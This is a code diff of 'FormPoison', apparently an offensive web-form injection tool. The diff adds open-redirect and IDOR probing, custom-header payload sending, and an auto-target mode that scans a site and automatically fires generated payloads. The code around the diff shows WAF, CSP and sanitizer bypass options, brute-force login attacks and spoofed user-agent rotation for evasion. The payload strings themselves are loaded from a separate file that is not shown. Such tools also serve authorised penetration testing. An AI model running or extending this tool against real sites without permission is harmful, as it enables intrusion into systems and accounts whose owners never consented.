+    redirect_payloads = [p for p in payloads if 'REDIRECT' in p['category']]
+    
+    if redirect_payloads:
+        console.print(f"[blue]Testing open redirect with {len(redirect_payloads)} payloads[/blue]")
+        
+        redirect_params = ['redirect', 'return', 'url', 'next', 'target']
+        for param in redirect_params:
+            test_url = f"{url}?{param}="
+            await test_input_field(test_url, redirect_payloads, "REDIRECT", cookies, user_agents, 
+                                 {'name': param}, method="GET", proxies=proxies, ssl_cert=ssl_cert, 
+                                 ssl_key=ssl_key, ssl_verify=ssl_verify)
+
+async def test_race_condition_targeted(url, payloads, cookies, user_agents, content, proxies, ssl_cert, ssl_key, ssl_verify):
+    console.print("[yellow]🎯 Running targeted race condition tests[/yellow]")
+    # Implementation needed
+
+async def test_buffer_overflow_targeted(url, payloads, cookies, user_agents, content, proxies, ssl_cert, ssl_key, ssl_verify):
+    console.print("[yellow]🎯 Running targeted buffer overflow tests[/yellow]")
+    # Implementation needed
+
+async def test_with_custom_headers(url, payloads, cookies, user_agents, headers, proxies, ssl_cert, ssl_key, ssl_verify):
+    try:
+        ssl_context = ssl.create_default_context()
+        if ssl_cert and ssl_key:
+            ssl_context.load_cert_chain(ssl_cert, ssl_key)
+
+        async with aiohttp.ClientSession() as session:
+            for payload in payloads:
+                data = {'input': payload['inputField']}
+                async with session.post(url, data=data, headers=headers, cookies=cookies,
+                                      proxy=proxies.get('http') if proxies else None, ssl=ssl_verify) as response:
+                    content = await response.text()
+                    vulnerabilities = analyze_response(content, response.headers, payload['category'], payload['inputField'])
+                    
+                    if vulnerabilities:
+                        console.print(f"[red]Vulnerability found: {vulnerabilities}[/red]")
+    except Exception as e:
+        console.print(f"[red]Error testing with custom headers: {e}[/red]")
+
+async def test_idor_endpoint(url, payloads, cookies, user_agents, proxies, ssl_cert, ssl_key, ssl_verify):
+    try:
+        ssl_context = ssl.create_default_context()
+        if ssl_cert and ssl_key:
+            ssl_context.load_cert_chain(ssl_cert, ssl_key)
+
+        async with aiohttp.ClientSession() as session:
+            for payload in payloads:
+                test_url = url + payload['inputField']
+                async with session.get(test_url, cookies=cookies,
+                                     proxy=proxies.get('http') if proxies else None, ssl=ssl_verify) as response:
+                    content = await response.text()
+                    
+                    if response.status == 200 and len(content) > 100:
+                        console.print(f"[red]Potential IDOR found at: {test_url}[/red]")
+    except Exception as e:
+        console.print(f"[red]Error testing IDOR: {e}[/red]")
+
+
+        
 async def main():
     console.clear()
-    show_banner()
     parser = argparse.ArgumentParser(description="Over 3500 payloads included!")
     parser.add_argument("url", help="Form URL")
+    parser.add_argument("--no-banner", action="store_true", help="Skip banner animation on startup")
     parser.add_argument("--interactive", action="store_true", help="Interactive mode - more control over injections.")
     parser.add_argument("--scan", action="store_true", help="Perform a quick scan of the website")
     parser.add_argument("--max-urls", type=int, default=100, help="Maximum number of URLs to scan (default: 100)")
     parser.add_argument("--max-depth", type=int, default=3, help="Maximum depth of scanning (default: 3)")
     parser.add_argument("--workers", type=int, default=10, help="Number of workers for scanning (default: 10)")
+    parser.add_argument("--auto-target", action="store_true", 
+                   help="Automatically generate and use targeted payloads based on Go scanner results")
     parser.add_argument("-t", "--threat", choices=["HTML", "Java", "SQL"], help="Threat type to test (HTML, Java, SQL)")
     parser.add_argument("-p", "--payloads", default="payloads.json", help="JSON file with payloads")
     parser.add_argument("--cookies", help="Cookies: 'key1=value1; key2=value2'")
@@ -2566,14 +3163,95 @@ async def main():
     parser.add_argument("--encoder-bypass", action="store_true", help="Generate encoder bypass payloads")
     parser.add_argument("--encoding-confusion", action="store_true", help="Generate encoding confusion payloads")
     parser.add_argument("--size-overflow", action="store_true", help="Generate size overflow payloads")
-
-
     if len(sys.argv) == 1:
         console.print("[bold red]Enter valid command[/bold red]")
         parser.print_help()
         sys.exit()
 
     args = parser.parse_args()
+    
+    if not args.no_banner:
+        console.clear()
+        show_banner()
+    else:
+        console.print("[dim]FormPoison v.1.0.1.[/dim]")
+    default_user_agent = "FormPoison/v.1.0.1"
+    cookies = parse_cookies(args.cookies) if args.cookies else {}
+    proxies = parse_proxy(args.proxy) if args.proxy else None
+    user_agents = [default_user_agent]
+    shuffle_user_agents = [
+        # Chrome - Windows
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
+
+        # Chrome - macOS
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
+
+        # Chrome - Linux
+        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+
+        # Firefox - Windows
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:119.0) Gecko/20100101 Firefox/119.0",
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0",
+
+        # Firefox - macOS
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:120.0) Gecko/20100101 Firefox/120.0",
+
+        # Firefox - Linux
+        "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
+        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
+
+        # Safari - macOS
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Safari/605.1.15",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Safari/605.1.15",
+
+        # Safari - iOS
+        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
+        "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
+        "Mozilla/5.0 (iPad; CPU OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
+
+        # Edge - Windows
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0",
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36 Edg/118.0.0.0",
+
+        # Edge - macOS
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
+
+        # Android - Chrome Mobile
+        "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
+        "Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
+        "Mozilla/5.0 (Linux; Android 13; SM-A536B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
+        "Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
+        "Mozilla/5.0 (Linux; Android 11; Redmi Note 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
+
+        # Android - Samsung Browser
+        "Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/21.0 Chrome/110.0.5481.154 Mobile Safari/537.36",
+        "Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/20.0 Chrome/106.0.5249.126 Mobile Safari/537.36",
+
+        # Opera
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0",
+        "Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36 OPR/73.2.3816.54321",
+
+        # Legacy browsers for compatibility
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
+        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
+        "Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36"
+    ]
+
     if args.brute:
         console.print("[bold yellow]⚠️  BRUTE FORCE MODE ACTIVATED - USE WITH CAUTION! ⚠️[/bold yellow]")
 
@@ -2604,7 +3282,6 @@ async def main():
                 console.print("[bold yellow]Brute force cancelled.[/bold yellow]")
                 sys.exit(0)
 
-
     if not args.url.startswith(('http://', 'https://')):
         response = console.input(f"You entered site '{args.url}' without https protocol provided[bold yellow] Switch to https? (Y/n): [/bold yellow]")
         if response.lower() in ('yes', 'y'):
@@ -2618,16 +3295,82 @@ async def main():
         console.print(f"[bold green]URL starts with HTTP: {args.url}[/bold green]")
 
     bypass_flags = {
-    'waf_bypass': args.waf_bypass,
-    'csp_bypass': args.csp_bypass,
-    'sanitizer_bypass': args.sanitizer_bypass,
-    'encoder_bypass': args.encoder_bypass,
-    'encoding_confusion': args.encoding_confusion,
-    'size_overflow': args.size_overflow
-}
+        'waf_bypass': args.waf_bypass,
+        'csp_bypass': args.csp_bypass,
+        'sanitizer_bypass': args.sanitizer_bypass,
+        'encoder_bypass': args.encoder_bypass,
+        'encoding_confusion': args.encoding_confusion,
+        'size_overflow': args.size_overflow
+    }
 
-    # load only if not scanning
-    if not args.scan:
+    payloads = []
+
+    if args.scan:
+        console.print("[bold blue]Running Go scanner for deep vulnerability analysis...[/bold blue]")
+        scan_report, attack_recommendations = go_scanner.scan_and_analyze(
+            args.url, args.max_urls, args.max_depth, args.workers, args.proxy
+        )
+
+        if scan_report:
+            # loading payloads and apply targeting
+            base_payloads = load_payloads(args.payloads, {})
+            targeted_payloads = go_scanner.generate_context_aware_payloads(
+                scan_report, base_payloads, bypass_flags
+            )
+            
+            # save them now
+            with open("targeted_payloads.json", "w") as f:
+                json.dump(targeted_payloads, f, indent=2)
+                
+            console.print(f"[green]Generated {len(targeted_payloads)} targeted payloads[/green]")
+            console.print(f"[green]Saved to: targeted_payloads.json[/green]")
+            
+            # ask user 
+            if attack_recommendations:
+                response = console.input("[yellow]Proceed with targeted testing? (Y/n): [/yellow]")
+                if response.lower() in ('', 'y', 'yes'):
+                    # targeted payloads for automatic testing
+                    payloads = targeted_payloads
+                    args.scan = False  # default testing
+                else:
+                    sys.exit(0)
+        else:
+            console.print("[red]Scan failed, using standard payloads[/red]")
+            payloads = load_payloads(args.payloads, bypass_flags)
+
+    if args.auto_target:
+        console.print("[bold blue]AUTO-TARGET MODE ACTIVATED[/bold blue]")
+        console.print("[bold blue]Running Go scanner for targeted vulnerability analysis...[/bold blue]")
+        scan_report, attack_recommendations = go_scanner.scan_and_analyze(
+            args.url, args.max_urls, args.max_depth, args.workers, args.proxy
+        )
+
+        if scan_report:
+            base_payloads = load_payloads(args.payloads, bypass_flags)
+            targeted_payloads = generate_targeted_payloads(scan_report, base_payloads)
+            
+            with open("targeted_payloads.json", "w") as f:
+                json.dump(targeted_payloads, f, indent=2)
+                    
+            console.print(f"[green]Generated {len(targeted_payloads)} targeted payloads based on scan results[/green]")
+            console.print(f"[green]Saved to: targeted_payloads.json[/green]")
+            
+            payloads = targeted_payloads
+            
+            console.print("[bold green]🚀 Starting automated targeted testing...[/bold green]")
+            await automated_targeted_testing(
+                args.url, targeted_payloads, scan_report, cookies, user_agents,
+                proxies=proxies, ssl_cert=args.ssl_cert, ssl_key=args.ssl_key, 
+                ssl_verify=args.ssl_verify, brute_mode=args.brute,
+                max_concurrent=args.concurrent, timeout=args.timeout
+            )
+            return
+            
+        else:
+            console.print("[red]❌ Scan failed, falling back to standard payloads[/red]")
+            payloads = load_payloads(args.payloads, bypass_flags)
+
+    if not payloads and not args.scan:
         payloads = load_payloads(args.payloads, bypass_flags)
 
         if args.filter:
@@ -2639,113 +3382,20 @@ async def main():
             payloads = [payload for payload in payloads if payload['category'] == args.threat]
             console.print(f"[bold green]Filtered payloads for threat type: {args.threat}[/bold green]")
 
-    if args.scan:
-        # run go scan
-        console.print("[bold blue]Running Go scanner for deep vulnerability analysis...[/bold blue]")
-        attack_recommendations = go_scanner.scan_and_analyze(args.url, args.max_urls, args.max_depth, args.workers)
-
-        if attack_recommendations:
-            console.print("[bold green]Recommended attacks based on scan results:[/bold green]")
-            for i, recommendation in enumerate(attack_recommendations, 1):
-                console.print(f"{i}. {recommendation}")
-        else:
-            console.print("[bold yellow]No specific attack recommendations from Go scanner.[/bold yellow]")
-
-        # technology stack scan
-        await scan(args.url)
-
-        sys.exit(0)
-    default_user_agent = "FormPoison/v.1.0.1"
-    cookies = parse_cookies(args.cookies) if args.cookies else {}
-    proxies = parse_proxy(args.proxy) if args.proxy else None
-    shuffle_user_agents = [
-    # Chrome - Windows
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
-
-    # Chrome - macOS
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
-
-    # Chrome - Linux
-    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
-
-    # Firefox - Windows
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:119.0) Gecko/20100101 Firefox/119.0",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0",
-
-    # Firefox - macOS
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:120.0) Gecko/20100101 Firefox/120.0",
-
-    # Firefox - Linux
-    "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
-    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
-
-    # Safari - macOS
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Safari/605.1.15",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Safari/605.1.15",
-
-    # Safari - iOS
-    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
-    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
-    "Mozilla/5.0 (iPad; CPU OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
-
-    # Edge - Windows
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36 Edg/118.0.0.0",
-
-    # Edge - macOS
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
-
-    # Android - Chrome Mobile
-    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
-    "Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
-    "Mozilla/5.0 (Linux; Android 13; SM-A536B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
-    "Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
-    "Mozilla/5.0 (Linux; Android 11; Redmi Note 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
-
-    # Android - Samsung Browser
-    "Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/21.0 Chrome/110.0.5481.154 Mobile Safari/537.36",
-    "Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/20.0 Chrome/106.0.5249.126 Mobile Safari/537.36",
-
-    # Opera
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0",
-    "Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36 OPR/73.2.3816.54321",
-
-    # Legacy browsers for compatibility
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
-    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
-    "Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36"
-]
-
     if args.user_agent:
-        if args.user_agent.lower()=='random':
-            user_agents=shuffle_user_agents
+        if args.user_agent.lower() == 'random':
+            user_agents = shuffle_user_agents
             random.shuffle(user_agents)
             console.print(f"[bold green]Using random User Agent[/bold green]")
         else:
-            matching_agents=[user_agent for user_agent in shuffle_user_agents if args.user_agent.lower() in user_agent.lower()]
+            matching_agents = [user_agent for user_agent in shuffle_user_agents if args.user_agent.lower() in user_agent.lower()]
             if matching_agents:
-                user_agents=[matching_agents[0]]
+                user_agents = [matching_agents[0]]
                 console.print(f"[bold green]Using specified user agent: {user_agents[0]}[/bold green]")
             else:
                 user_agents = [args.user_agent]
                 console.print(f"[bold green]Using custom user agent: {args.user_agent}[/bold green]")
     else:
-        user_agents = [default_user_agent]
         console.print(f"[bold blue]Using default User Agent: {default_user_agent}[/bold blue]")
 
     page_content = None
@@ -2760,7 +3410,6 @@ async def main():
 
     input_fields = get_string_input_fields(page_content)
     console.print(f"[bold green]{len(input_fields)} String input fields found[/bold green]")
-    ##news
 
     if args.filemode:
         console.print("[bold blue]📁 Testing Filename XSS in upload forms...[/bold blue]")
@@ -2769,10 +3418,8 @@ async def main():
             args.url, input_fields, cookies, user_agents, proxies, args.ssl_verify
         )
 
-
         for result in filemode_results:
             console.print(f"[red]FILENAME XSS: {result['field']} → {result['filename']} → {result['vulnerability']}[/red]")
-
 
     if args.mXSS:
         console.print("[bold blue]🧬 Testing Mutation XSS vulnerabilities...[/bold blue]")
@@ -2783,19 +3430,16 @@ async def main():
             login_field = None
             password_field = None
 
-
             for field in input_fields:
                 name = field.get('name', '').lower()
                 id_ = field.get('id', '').lower()
                 placeholder = field.get('placeholder', '').lower()
                 field_type = field.get('type', '').lower()
 
-
                 login_keywords = ['login', 'username', 'user', 'email', 'e-mail', 'mail', 'userid', 'user_id', 'loginname', 'account', 'mat-input-1']
                 if any(keyword in name or keyword in id_ or keyword in placeholder for keyword in login_keywords):
                     login_field = field
                     console.print(f"[bold green]Found login field: name={name}, id={id_}, type={field_type}[/bold green]")
-
 
                 password_keywords = ['password', 'pass', 'passwd', 'pwd', 'userpassword', 'user_pass']
                 if any(keyword in name or keyword in id_ or keyword in placeholder for keyword in password_keywords):
@@ -2877,7 +3521,6 @@ async def main():
             max_retries=args.retries
         )
         sys.exit(0)
-
     else:
         if len(user_agents) > 1:
             console.print(f"[bold green]Testing all forms with {len(user_agents)} shuffled User Agents[/bold green]")
@@ -2894,7 +3537,6 @@ async def main():
             batch_delay=args.batch_delay,
             max_retries=args.retries
         )
-
 
 
 if __name__ == "__main__":
